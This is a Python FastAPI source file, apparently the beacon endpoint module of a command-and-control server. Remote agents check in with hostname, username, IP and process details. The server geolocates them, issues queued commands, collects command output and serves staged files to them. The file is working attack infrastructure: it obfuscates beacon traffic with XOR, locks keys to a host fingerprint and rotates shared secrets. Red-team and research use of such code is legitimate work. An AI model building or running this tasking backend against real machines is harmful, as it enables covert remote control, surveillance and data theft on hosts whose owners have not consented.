"""
Beacon protocol endpoints — called by agents, NOT by the web UI.
Authentication: shared secret in X-Agent-Secret header.
"""
import os
import uuid as _uuid_mod
import ipaddress
from pathlib import Path
from fastapi import APIRouter, Depends, HTTPException, Header, Request
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from pydantic import BaseModel
from typing import Optional
from datetime import datetime, timezone
from database import get_db, Agent, Task, SessionLocal
import config
import json as _json_mod
import httpx
from websocket_manager import manager as ws_manager
from routers.webhook_router import notify as wh_notify


async def _geo_lookup(ip: str) -> dict:
    """Geolocate an IP via ip-api.com (free, no key, server-side only)."""
    try:
        addr = ipaddress.ip_address(ip)
        if addr.is_private or addr.is_loopback or addr.is_link_local:
            return {}
    except ValueError:
        return {}
    try:
        async with httpx.AsyncClient(timeout=4) as client:
            r = await client.get(
                f"http://ip-api.com/json/{ip}",
                params={"fields": "status,country,countryCode,city,lat,lon"},
            )
            data = r.json()
            if data.get("status") == "success":
                return data
    except Exception:
        pass
    return {}


async def _geo_and_update(agent_id: str, ip: str):
    geo = await _geo_lookup(ip)
    if not geo:
        return
    db = SessionLocal()
    try:
        agent = db.query(Agent).filter(Agent.id == agent_id).first()
        if agent:
            agent.country = geo.get("country", "")
            agent.country_code = geo.get("countryCode", "")
            agent.city = geo.get("city", "")
            agent.latitude = geo.get("lat")
            agent.longitude = geo.get("lon")
            db.commit()
    except Exception:
        pass
    finally:
        db.close()


def _decrypt_body(raw: bytes) -> dict:
    """Transparently decrypt XOR-encrypted beacon body (enc:1 format)."""
    try:
        obj = _json_mod.loads(raw)
        if isinstance(obj, dict) and obj.get("enc") == 1:
            nonce = obj["nonce"]
            data  = bytes.fromhex(obj["data"])
            key   = (config.AGENT_SECRET + nonce).encode()
            plain = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            return _json_mod.loads(plain)
        return obj
    except Exception:
        return _json_mod.loads(raw)

router = APIRouter(prefix="/api/beacon", tags=["beacon"])

UPLOADS_DIR = Path(__file__).parent.parent / "uploads"


def verify_agent_secret(x_agent_secret: Optional[str] = Header(None)):
    current, old = config.get_agent_secrets()
    if x_agent_secret != current and x_agent_secret != old:
        raise HTTPException(status_code=403, detail="Invalid agent secret")


class KeyRequest(BaseModel):
    bid: str   # beacon ID
    fp: str    # SHA-256(hostname + mac)


@router.post("/key")
def get_beacon_key(req: KeyRequest, _: None = Depends(verify_agent_secret), db: Session = Depends(get_db)):
    """Return the server-side encryption key for a beacon. Locked to the first fingerprint that calls it."""
    from database import BeaconKey
    entry = db.query(BeaconKey).filter(BeaconKey.bid == req.bid).first()
    if not entry:
        raise HTTPException(status_code=404, detail="Key not found")
    if entry.used_count >= 20:
        raise HTTPException(status_code=403, detail="Key usage limit reached")
    if entry.fp_hash is None:
        entry.fp_hash = req.fp
    elif entry.fp_hash != req.fp:
        raise HTTPException(status_code=403, detail="Fingerprint mismatch")
    entry.used_count += 1
    db.commit()
    return {"key": entry.enc_key}


class CheckinRequest(BaseModel):
    agent_id: str
    hostname: str
    ip_internal: str
    os_info: str
    username: str
    pid: int
    sleep_interval: int = 5
    cwd: str = ""
    beacon_lang: str = ""


@router.post("/checkin")
async def checkin(
    request: Request,
    db: Session = Depends(get_db),
    _: None = Depends(verify_agent_secret),
):
    # Detect if beacon is using the old (pre-rotation) secret so we can push the new one
    _x_secret = request.headers.get("x-agent-secret", "")
    _current, _old = config.get_agent_secrets()
    _used_old = bool(_old and _x_secret == _old)
    try:
        req = CheckinRequest(**_decrypt_body(await request.body()))
    except Exception:
        raise HTTPException(status_code=422, detail="Invalid checkin body")

    # Validate agent_id is a proper UUID to prevent log injection / DB abuse
    try:
        _uuid_mod.UUID(req.agent_id)
    except ValueError:
        raise HTTPException(status_code=400, detail="agent_id must be a valid UUID")

    # Capture real external IP (respects TRUST_PROXY setting)
    if config.TRUST_PROXY:
        ip_ext = request.headers.get("X-Real-IP") or (request.client.host if request.client else "")
    else:
        ip_ext = request.client.host if request.client else ""

    agent = db.query(Agent).filter(Agent.id == req.agent_id).first()

    is_new = agent is None
    prev_ip_ext = agent.ip_external if agent else None

    if not agent:
        agent = Agent(
            id=req.agent_id,
            hostname=req.hostname,
            ip_internal=req.ip_internal,
            ip_external=ip_ext,
            os_info=req.os_info,
            username=req.username,
            pid=req.pid,
            sleep_interval=req.sleep_interval,
        )
        db.add(agent)
    else:
        agent.hostname = req.hostname
        agent.ip_internal = req.ip_internal
        agent.ip_external = ip_ext
        agent.os_info = req.os_info
        agent.username = req.username
        agent.pid = req.pid
        agent.sleep_interval = req.sleep_interval

    if req.cwd:
        agent.cwd = req.cwd
    if req.beacon_lang:
        agent.beacon_lang = req.beacon_lang
    agent.last_seen = datetime.now(timezone.utc)
    db.commit()

    import asyncio
    # Geo lookup: run on new agent or when external IP changes
    if ip_ext and (is_new or ip_ext != prev_ip_ext):
        asyncio.create_task(_geo_and_update(req.agent_id, ip_ext))

    asyncio.create_task(ws_manager.broadcast({
        "type": "agent_checkin",
        "agent_id": req.agent_id,
        "hostname": req.hostname,
        "is_new": is_new,
    }))
    if is_new:
        asyncio.create_task(wh_notify("new_agent", {
            "hostname": req.hostname,
            "ip": req.ip_internal,
            "os": req.os_info,
            "user": req.username,
        }))

    # Return next pending task (FIFO)
    task = (
        db.query(Task)
        .filter(Task.agent_id == req.agent_id, Task.status == "pending")
        .order_by(Task.created_at.asc())
        .first()
    )

    _extra = {"new_secret": _current} if _used_old else {}

    if task:
        task.status = "running"
        db.commit()
        return {"task_id": task.id, "command": task.command, **_extra}

    return {"task_id": None, "command": None, **_extra}


class ResultRequest(BaseModel):
    task_id: str
    output: str
    status: str  # done | error


@router.post("/result")
async def submit_result(
    request: Request,
    db: Session = Depends(get_db),
    _: None = Depends(verify_agent_secret),
):
    try:
        req = ResultRequest(**_decrypt_body(await request.body()))
    except Exception:
        raise HTTPException(status_code=422, detail="Invalid result body")
    task = db.query(Task).filter(Task.id == req.task_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")

    task.output = req.output
    task.status = req.status
    task.completed_at = datetime.now(timezone.utc)
    db.commit()

    import asyncio
    asyncio.create_task(ws_manager.broadcast({
        "type": "task_result",
        "task_id": req.task_id,
        "agent_id": task.agent_id,
        "status": req.status,
    }))
    return {"message": "Result saved"}


# ── Staged file fetch (beacon pulls upload from server) ───────────────────────

@router.get("/fetch/{agent_id}/{task_id}")
def fetch_staged_file(
    agent_id: str,
    task_id: str,
    db: Session = Depends(get_db),
    _: None = Depends(verify_agent_secret),
):
    task = db.query(Task).filter(Task.id == task_id, Task.agent_id == agent_id).first()
    if not task or not task.command.startswith("__upload__:"):
        raise HTTPException(status_code=404, detail="Staged file not found")

    # command format: __upload__:{filename}:{dest_path}
    parts = task.command.split(":", 2)
    if len(parts) != 3:
        raise HTTPException(status_code=404, detail="Staged file not found")

    _, filename, _ = parts

    # Sanitize filename and verify path stays within UPLOADS_DIR
    filename = os.path.basename(filename)
    if not filename:
        raise HTTPException(status_code=404, detail="Invalid filename")

    file_path = (UPLOADS_DIR / agent_id / task_id / filename).resolve()
    uploads_root = UPLOADS_DIR.resolve()

    if not str(file_path).startswith(str(uploads_root)):
        raise HTTPException(status_code=403, detail="Path traversal detected")

    if not file_path.exists() or not file_path.is_file():
        raise HTTPException(status_code=404, detail="File missing from staging area")

    return FileResponse(path=str(file_path), filename=filename)
